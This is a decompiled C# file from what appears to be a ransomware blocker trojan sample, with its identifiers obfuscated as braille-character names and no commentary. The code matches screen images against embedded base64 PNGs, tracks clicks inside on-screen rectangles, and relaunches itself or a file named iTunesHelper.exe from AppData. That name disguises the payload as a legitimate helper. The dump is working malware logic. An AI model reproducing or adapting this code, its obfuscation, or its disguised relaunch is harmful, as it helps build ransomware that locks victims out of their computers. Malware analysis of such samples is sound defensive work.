// Decompiled with JetBrains decompiler
// Type: JavaCPL.⠎⠧⡢⣞⡹⡒⠸⢰⢂⠉⢵⠦⡷⠈⢁⠒⢭⢸⢝⣖⢴⠸⠝⢏⡐⣂⢮⠨⢴⢉⡬⡺⢋⡕⢜⢓⡅
// Assembly: .2.0, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D728DFE8-0424-42D7-ACC0-907783455C02
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.ibct-b02e1fcc2ef9de8dc5b061667d8124e703544516922dd8f6779b2614a9a27bc6.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace JavaCPL
{
  public static class \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845
  {
    private static Point \u289C\u2892\u28D4\u2828\u2846\u28D7\u28A7\u281C\u2893\u28BC\u28BF\u2828\u2896\u28C0\u2825\u2841\u2879\u28B6\u2809\u28B3\u288D\u2897\u2884;
    public static List<int> \u28DC\u28D9\u287C\u283B\u287A\u2821\u284B\u28CD\u28AC\u28AD\u281C\u280A\u2802\u288C\u28D1\u2825\u28C7\u2834\u282F\u28D1\u2849\u288C\u28D2\u288C\u2854 = new List<int>();

    public static void \u28BB\u28C6\u288A\u2872\u2852\u2804\u280E\u28C4\u282C\u284D\u285B\u286C\u2881\u2871\u2871\u28D1\u285B\u28C8\u28A4\u281B\u283E\u28CD\u28C5\u28C4\u28CB\u2859\u2867\u2892\u28A6\u284F\u2806\u28D0\u28C6\u2830\u2846\u2865(
      int _param0,
      int _param1)
    {
      Point point = \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.\u2855\u285F\u2803\u288A\u28CD\u2810\u2875\u289F\u2828\u282A\u2878\u2878\u282F\u2848\u2800\u2887\u287D\u2835\u284E\u281A\u2801\u284B\u28DD\u28C5\u2878\u2864\u28CF\u28C0\u28AC\u2803\u28B3\u2869\u286B\u282A\u2869\u2832\u2821\u28AD\u2851\u2846\u28B7\u2882\u289C\u280B\u2882\u28A7\u289B\u286B\u2820;
      if (point == Rectangle.Empty.Location)
        return;
      _param0 -= \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u289C\u2892\u28D4\u2828\u2846\u28D7\u28A7\u281C\u2893\u28BC\u28BF\u2828\u2896\u28C0\u2825\u2841\u2879\u28B6\u2809\u28B3\u288D\u2897\u2884.X;
      _param1 -= \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u289C\u2892\u28D4\u2828\u2846\u28D7\u28A7\u281C\u2893\u28BC\u28BF\u2828\u2896\u28C0\u2825\u2841\u2879\u28B6\u2809\u28B3\u288D\u2897\u2884.Y;
      Rectangle rectangle = new Rectangle(point.X + 300, point.Y + 155, 155, 21);
      if (\u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u28B0\u289C\u284A\u2862\u28D7\u282C\u28B2\u2888\u280F\u286E\u280A\u2812\u287F\u2821\u28C9\u2804\u28BB\u289C\u2865\u2837\u28BD\u2883\u2811\u285F\u28AD\u2874\u2839\u28D7\u28A3\u28D2(_param0, _param1, rectangle.Left, rectangle.Top, rectangle.Right, rectangle.Bottom))
        \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u28DC\u28D9\u287C\u283B\u287A\u2821\u284B\u28CD\u28AC\u28AD\u281C\u280A\u2802\u288C\u28D1\u2825\u28C7\u2834\u282F\u28D1\u2849\u288C\u28D2\u288C\u2854 = new List<int>();
      for (int index = 0; index < 10; ++index)
      {
        \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.RECT rect = \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.\u28B3\u2825\u281F\u2887\u287C\u2890\u282E\u2821\u289F\u2833\u28DB\u2841\u280F\u2880\u286E\u28BA\u2888\u28AB\u2804\u2803\u28A2\u28DB\u2888\u284A\u2822\u2838\u2867\u2853\u2885\u2873\u284E\u28CB\u28D5\u289D\u281E[index];
        if (\u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u28B0\u289C\u284A\u2862\u28D7\u282C\u28B2\u2888\u280F\u286E\u280A\u2812\u287F\u2821\u28C9\u2804\u28BB\u289C\u2865\u2837\u28BD\u2883\u2811\u285F\u28AD\u2874\u2839\u28D7\u28A3\u28D2(_param0, _param1, rect.left, rect.top, rect.right, rect.bottom))
        {
          \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u28DC\u28D9\u287C\u283B\u287A\u2821\u284B\u28CD\u28AC\u28AD\u281C\u280A\u2802\u288C\u28D1\u2825\u28C7\u2834\u282F\u28D1\u2849\u288C\u28D2\u288C\u2854.Add(\u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.\u28C1\u288C\u28D7\u28D6\u28B2\u2810\u28D1\u284B\u2854\u287C\u2884\u2862\u28D0\u2848\u289F\u28B6\u281D\u286F\u2882\u28B7\u287C\u28B4\u2865\u2844\u2829\u28BB\u287C\u282B\u28C4\u2810\u284C\u2851\u2861\u2818\u28D8\u28DB\u28B3\u280E[index]);
          if (\u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u28DC\u28D9\u287C\u283B\u287A\u2821\u284B\u28CD\u28AC\u28AD\u281C\u280A\u2802\u288C\u28D1\u2825\u28C7\u2834\u282F\u28D1\u2849\u288C\u28D2\u288C\u2854.Count == 4)
          {
            \u2872\u2899\u281B\u2891\u28CA\u28A9\u2856\u2870\u2821\u2884\u28A6\u28A7\u2891\u2800\u2825\u28AE\u2848\u280C\u2812\u28D7\u28A2\u28D6\u28AB\u288A\u2845\u28B3\u28AA\u28B6\u283F\u286E\u2854\u2873\u288B\u286F\u280C\u287D\u2843\u2828\u2870\u28D5\u2869\u2871\u28C4\u281F\u2875\u2878\u287E\u2854\u2868\u2802\u281C\u2896\u2857\u2859.\u28C9\u28CB\u2837\u2884\u2809\u285F\u288C\u2844\u2808\u288B\u28B9\u28C9\u2884\u28CF\u283D\u2889\u28BD\u2818\u28D9\u2884\u28C8\u289E\u288F\u28AA\u28DC\u28AC\u285C\u28A6\u28AA\u280B\u2870 = true;
            \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.\u289D\u28C8\u28D5\u289B\u2890\u280A\u2861\u281D\u2812\u2868\u2821\u2894\u28D2\u2825\u2857\u280F\u280D\u2804\u28BE\u28AE\u2866\u28AF\u28C3\u2807\u2842\u285E\u288E\u28D2\u2843\u28B1\u28A8\u2863\u28A0\u2812\u2845\u28CB\u2873\u28B0\u2879\u285F\u28B0\u2803\u289B\u28C8\u2825\u2822\u2890\u2877\u2893\u2873\u2899 = true;
            try
            {
              \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.\u283D\u28D0\u28AE\u2840\u28BD\u28BF\u2891\u2824\u2858\u283E\u2857\u284C\u2842\u28C5\u2835\u281A\u283F\u28CB\u28B4\u2821\u2841\u283A\u281D\u2844\u28B5.Dispose();
            }
            catch
            {
            }
            int tickCount = Environment.TickCount;
            while (Environment.TickCount - tickCount < 6000)
            {
              Thread.Sleep(4000);
              if (\u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u28B0\u287B\u28A2\u2899\u2831\u280D\u289E\u2802\u28B1\u288D\u282E\u2813\u283C\u28D2\u2891\u2898\u2887\u2894\u282B\u28CD\u2839\u28A4\u2852\u2811\u28CD\u2876\u28D3\u28CA\u2822\u281F\u2860\u28AD\u2818\u28A1\u2889\u28A5\u280A\u284C\u2848\u288A())
              {
                \u28D1\u2805\u28D6\u2852\u281E\u2847\u2825\u2877\u288F\u281E\u286C\u28DA\u280B\u2878\u28BB\u28AB\u2852\u28A2\u2894\u2820\u2883\u287F\u2838\u28BE\u289A\u2842\u288D\u28DB\u287B.\u2891\u28B1\u288C\u28B8\u28AA\u2864\u2861\u282F\u2868\u2889\u2864\u2857\u2888\u2801\u2849\u28AB\u28B3\u282C\u2828\u2822\u2853\u2812\u2800\u28BF();
                Thread.Sleep(500);
                \u28D1\u2805\u28D6\u2852\u281E\u2847\u2825\u2877\u288F\u281E\u286C\u28DA\u280B\u2878\u28BB\u28AB\u2852\u28A2\u2894\u2820\u2883\u287F\u2838\u28BE\u289A\u2842\u288D\u28DB\u287B.\u28D4\u2812\u28B7\u2869\u284C\u2809\u285D\u28A7\u2873\u2889\u2822\u28DE\u2843\u2888\u287C\u2832\u2801\u2876\u28C3\u2871\u2869\u2823\u2886\u2894\u2811\u28C6\u28D0\u2849\u28DF\u288B\u2854\u2845\u287C\u2853\u28CC\u28C2\u2811\u2814\u2892\u28DF\u28CA\u2865\u2836\u2860\u286E\u289D\u2805\u2868\u285A\u2889\u2814();
                \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u28DC\u28D9\u287C\u283B\u287A\u2821\u284B\u28CD\u28AC\u28AD\u281C\u280A\u2802\u288C\u28D1\u2825\u28C7\u2834\u282F\u28D1\u2849\u288C\u28D2\u288C\u2854 = new List<int>();
                if (File.Exists(Environment.GetEnvironmentVariable("AppData") + "\\iTunesHelper.exe"))
                {
                  try
                  {
                    Process.Start(Environment.GetEnvironmentVariable("AppData") + "\\iTunesHelper.exe");
                    \u2872\u2899\u281B\u2891\u28CA\u28A9\u2856\u2870\u2821\u2884\u28A6\u28A7\u2891\u2800\u2825\u28AE\u2848\u280C\u2812\u28D7\u28A2\u28D6\u28AB\u288A\u2845\u28B3\u28AA\u28B6\u283F\u286E\u2854\u2873\u288B\u286F\u280C\u287D\u2843\u2828\u2870\u28D5\u2869\u2871\u28C4\u281F\u2875\u2878\u287E\u2854\u2868\u2802\u281C\u2896\u2857\u2859.\u2873\u2832\u288B\u2805\u28C3\u28D1\u2850\u285B\u2814\u2852\u2812\u2891\u28CF\u28BF\u2860\u2834\u2814\u289C\u28DC\u28C3\u289F\u283E\u2864\u2838();
                    Environment.Exit(0);
                  }
                  catch (Exception ex1)
                  {
                    try
                    {
                      Application.Restart();
                    }
                    catch (Exception ex2)
                    {
                      \u2872\u2899\u281B\u2891\u28CA\u28A9\u2856\u2870\u2821\u2884\u28A6\u28A7\u2891\u2800\u2825\u28AE\u2848\u280C\u2812\u28D7\u28A2\u28D6\u28AB\u288A\u2845\u28B3\u28AA\u28B6\u283F\u286E\u2854\u2873\u288B\u286F\u280C\u287D\u2843\u2828\u2870\u28D5\u2869\u2871\u28C4\u281F\u2875\u2878\u287E\u2854\u2868\u2802\u281C\u2896\u2857\u2859.\u2873\u2832\u288B\u2805\u28C3\u28D1\u2850\u285B\u2814\u2852\u2812\u2891\u28CF\u28BF\u2860\u2834\u2814\u289C\u28DC\u28C3\u289F\u283E\u2864\u2838();
                      Environment.Exit(0);
                    }
                  }
                }
                else
                {
                  try
                  {
                    Application.Restart();
                  }
                  catch (Exception ex)
                  {
                    \u2872\u2899\u281B\u2891\u28CA\u28A9\u2856\u2870\u2821\u2884\u28A6\u28A7\u2891\u2800\u2825\u28AE\u2848\u280C\u2812\u28D7\u28A2\u28D6\u28AB\u288A\u2845\u28B3\u28AA\u28B6\u283F\u286E\u2854\u2873\u288B\u286F\u280C\u287D\u2843\u2828\u2870\u28D5\u2869\u2871\u28C4\u281F\u2875\u2878\u287E\u2854\u2868\u2802\u281C\u2896\u2857\u2859.\u2873\u2832\u288B\u2805\u28C3\u28D1\u2850\u285B\u2814\u2852\u2812\u2891\u28CF\u28BF\u2860\u2834\u2814\u289C\u28DC\u28C3\u289F\u283E\u2864\u2838();
                    Environment.Exit(0);
                  }
                }
              }
            }
            \u2872\u2899\u281B\u2891\u28CA\u28A9\u2856\u2870\u2821\u2884\u28A6\u28A7\u2891\u2800\u2825\u28AE\u2848\u280C\u2812\u28D7\u28A2\u28D6\u28AB\u288A\u2845\u28B3\u28AA\u28B6\u283F\u286E\u2854\u2873\u288B\u286F\u280C\u287D\u2843\u2828\u2870\u28D5\u2869\u2871\u28C4\u281F\u2875\u2878\u287E\u2854\u2868\u2802\u281C\u2896\u2857\u2859.\u28C9\u28CB\u2837\u2884\u2809\u285F\u288C\u2844\u2808\u288B\u28B9\u28C9\u2884\u28CF\u283D\u2889\u28BD\u2818\u28D9\u2884\u28C8\u289E\u288F\u28AA\u28DC\u28AC\u285C\u28A6\u28AA\u280B\u2870 = false;
            \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.\u289D\u28C8\u28D5\u289B\u2890\u280A\u2861\u281D\u2812\u2868\u2821\u2894\u28D2\u2825\u2857\u280F\u280D\u2804\u28BE\u28AE\u2866\u28AF\u28C3\u2807\u2842\u285E\u288E\u28D2\u2843\u28B1\u28A8\u2863\u28A0\u2812\u2845\u28CB\u2873\u28B0\u2879\u285F\u28B0\u2803\u289B\u28C8\u2825\u2822\u2890\u2877\u2893\u2873\u2899 = false;
            \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u28DC\u28D9\u287C\u283B\u287A\u2821\u284B\u28CD\u28AC\u28AD\u281C\u280A\u2802\u288C\u28D1\u2825\u28C7\u2834\u282F\u28D1\u2849\u288C\u28D2\u288C\u2854 = new List<int>();
          }
        }
      }
    }

    public static bool \u28B0\u289C\u284A\u2862\u28D7\u282C\u28B2\u2888\u280F\u286E\u280A\u2812\u287F\u2821\u28C9\u2804\u28BB\u289C\u2865\u2837\u28BD\u2883\u2811\u285F\u28AD\u2874\u2839\u28D7\u28A3\u28D2(
      int _param0,
      int _param1,
      int _param2,
      int _param3,
      int _param4,
      int _param5)
    {
      return _param0 > _param2 && _param0 < _param4 && _param1 < _param5 && _param1 > _param3;
    }

    public static int \u28C9\u28BA\u287F\u2831\u28CD\u282F\u28C4\u289F\u28BC\u282E\u28C5\u28B9\u28C6\u2861\u2833\u285E\u2848\u28D6\u281B\u2886\u286C\u2898\u280A\u2829\u28CE\u285F\u2878\u2825\u282B\u289A\u282A(
      int _param0,
      int _param1)
    {
      for (int index = 0; index < \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.\u28B3\u2825\u281F\u2887\u287C\u2890\u282E\u2821\u289F\u2833\u28DB\u2841\u280F\u2880\u286E\u28BA\u2888\u28AB\u2804\u2803\u28A2\u28DB\u2888\u284A\u2822\u2838\u2867\u2853\u2885\u2873\u284E\u28CB\u28D5\u289D\u281E.Length; ++index)
      {
        \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.RECT rect = \u283B\u2834\u28C0\u2877\u28CF\u280C\u2861\u28BF\u28B9\u2849\u28D3\u2870\u280D\u285D\u28AE\u2854\u2829\u2843\u28BF\u2884\u287D\u284F\u28DF\u28A5\u285C\u2893\u285B\u28C3\u28CC\u28D5\u287E\u2886\u288B\u281C\u28A7\u2812\u2818\u28BC\u283C\u28AD\u28AB\u2894\u283C\u2854\u2813\u285B\u2859\u2894\u28C1\u281C\u281A\u287D\u284A\u2839\u2835.\u28B3\u2825\u281F\u2887\u287C\u2890\u282E\u2821\u289F\u2833\u28DB\u2841\u280F\u2880\u286E\u28BA\u2888\u28AB\u2804\u2803\u28A2\u28DB\u2888\u284A\u2822\u2838\u2867\u2853\u2885\u2873\u284E\u28CB\u28D5\u289D\u281E[index];
        if (\u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u28B0\u289C\u284A\u2862\u28D7\u282C\u28B2\u2888\u280F\u286E\u280A\u2812\u287F\u2821\u28C9\u2804\u28BB\u289C\u2865\u2837\u28BD\u2883\u2811\u285F\u28AD\u2874\u2839\u28D7\u28A3\u28D2(_param0, _param1, rect.left, rect.top, rect.right, rect.bottom))
          return index;
      }
      return -1;
    }

    public static Bitmap \u2810\u280A\u2894\u288D\u289E\u28C3\u283B\u2802\u2879\u2815\u2839\u2897\u2878\u2867\u28CC\u2853\u2861\u2819\u2853\u284A\u2814\u289A\u283C\u28A1\u2852\u2820\u28A4\u28C1(
      string _param0)
    {
      byte[] numArray1 = new byte[1];
      Bitmap bitmap = new Bitmap(1, 1);
      bool flag = false;
      while (flag)
        flag = false;
      try
      {
        byte[] numArray2 = Convert.FromBase64String(_param0);
        bitmap = (Bitmap) TypeDescriptor.GetConverter(typeof (Bitmap)).ConvertFrom((object) numArray2);
      }
      catch (Exception ex)
      {
      }
      return bitmap;
    }

    public static bool \u28B0\u287B\u28A2\u2899\u2831\u280D\u289E\u2802\u28B1\u288D\u282E\u2813\u283C\u28D2\u2891\u2898\u2887\u2894\u282B\u28CD\u2839\u28A4\u2852\u2811\u28CD\u2876\u28D3\u28CA\u2822\u281F\u2860\u28AD\u2818\u28A1\u2889\u28A5\u280A\u284C\u2848\u288A()
    {
      Point point = new Point(0, 0);
      Bitmap bitmap1 = \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u2810\u280A\u2894\u288D\u289E\u28C3\u283B\u2802\u2879\u2815\u2839\u2897\u2878\u2867\u28CC\u2853\u2861\u2819\u2853\u284A\u2814\u289A\u283C\u28A1\u2852\u2820\u28A4\u28C1("iVBORw0KGgoAAAANSUhEUgAAABUAAAAGCAIAAACjN0L0AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsAAAA7AAWrWiQkAAAB7SURBVChTY3C1NkBDbraGBJG7nREEMQA1u1jpIyNXG4NNhQxPVjE82cXw588bIAMogobgFqDrh6gz1xdrNIeiAHN1XPqBdjMATQJKA+1HVkSM/RBfQ/Wj2YBmP5Dr4aBfmBgAJKEqYaGGXT+a/WD96hD9kJCCWO5spQ8A3zNn1Sw/OrAAAAAASUVORK5CYII=");
      Bitmap bitmap2 = \u2846\u2883\u2882\u2865\u28A9\u280A\u2810\u289D\u283A\u2803\u288D\u28A5\u281F\u2800\u28A3\u284C\u28D4\u2821\u28C6\u2800\u2824\u2855\u2857\u28A2\u2889\u287A\u2873\u2885\u2889\u28AD\u2869\u281E\u28BB\u28DD\u28AB\u28B7\u28AB\u28C5\u289F\u2869\u2878\u2860.\u287E\u2842\u28B3\u2845\u2871\u287E\u28A2\u28D0\u2891\u283B\u288E\u2832\u2823\u281A\u28A9\u284D\u2849\u281A\u2835\u282D\u2875\u2821\u288E\u2892\u28AE\u2812\u2835\u28CE(out \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u289C\u2892\u28D4\u2828\u2846\u28D7\u28A7\u281C\u2893\u28BC\u28BF\u2828\u2896\u28C0\u2825\u2841\u2879\u28B6\u2809\u28B3\u288D\u2897\u2884);
      Point location1 = \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u2841\u2833\u28DE\u281F\u289A\u2824\u28B3\u289A\u284B\u280F\u28AA\u28C5\u2886\u2899\u287E\u280F\u284C\u28AC\u283F\u28BE\u28D3\u284E\u284E(bitmap1, bitmap2, 0.4).Location;
      bool flag = false;
      if (location1.X + location1.Y > 0)
      {
        flag = true;
      }
      else
      {
        Thread.Sleep(200);
        bitmap1 = \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u2810\u280A\u2894\u288D\u289E\u28C3\u283B\u2802\u2879\u2815\u2839\u2897\u2878\u2867\u28CC\u2853\u2861\u2819\u2853\u284A\u2814\u289A\u283C\u28A1\u2852\u2820\u28A4\u28C1("iVBORw0KGgoAAAANSUhEUgAAAA8AAAANCAIAAAD5fKMWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsAAAA7AAWrWiQkAAACeSURBVChTvZA9CsJAFAZzGJukixYuWCQgBMWQRAwqapMuWHkEb2DpdTPwwWNXtkglTLOP2dmfxC2z+STzVcy/2es8FcPtYDzOO9A8uAnre1/J+37exqXbMo/YZCS9xquPKkGbBkgtXWpUxYoJoV9barvfwKkuoG9KEtoQsTFkG3ZmYONZ2FfJ68yIrQvI9l/yHI6BTUP/IEloguryxQRqD5qjt7/emwAAAABJRU5ErkJggg==");
        Point location2 = \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u2841\u2833\u28DE\u281F\u289A\u2824\u28B3\u289A\u284B\u280F\u28AA\u28C5\u2886\u2899\u287E\u280F\u284C\u28AC\u283F\u28BE\u28D3\u284E\u284E(bitmap1, bitmap2, 0.4).Location;
        if (location2.X + location2.Y > 0)
          flag = true;
      }
      bitmap2.Dispose();
      bitmap1.Dispose();
      return flag;
    }

    public static Bitmap \u280A\u287A\u2826\u28A9\u2854\u289B\u280B\u2871\u287A\u2807\u28BE\u2842\u2878\u2824\u280C\u2829\u2891\u28AC\u289B\u2819\u28B4\u28BF\u2892\u282C\u2861() => \u280E\u2827\u2862\u28DE\u2879\u2852\u2838\u28B0\u2882\u2809\u28B5\u2826\u2877\u2808\u2881\u2812\u28AD\u28B8\u289D\u28D6\u28B4\u2838\u281D\u288F\u2850\u28C2\u28AE\u2828\u28B4\u2889\u286C\u287A\u288B\u2855\u289C\u2893\u2845.\u2810\u280A\u2894\u288D\u289E\u28C3\u283B\u2802\u2879\u2815\u2839\u2897\u2878\u2867\u28CC\u2853\u2861\u2819\u2853\u284A\u2814\u289A\u283C\u28A1\u2852\u2820\u28A4\u28C1("iVBORw0KGgoAAAANSUhEUgAAAAgAAAAHCAIAAAC6O5sJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsAAAA7AAWrWiQkAAAAgSURBVBhXY1jVVIcVMdBIIliAM0qIC0gCEYodBCQgmgAV/U5xB2QKQQAAAABJRU5ErkJggg==");

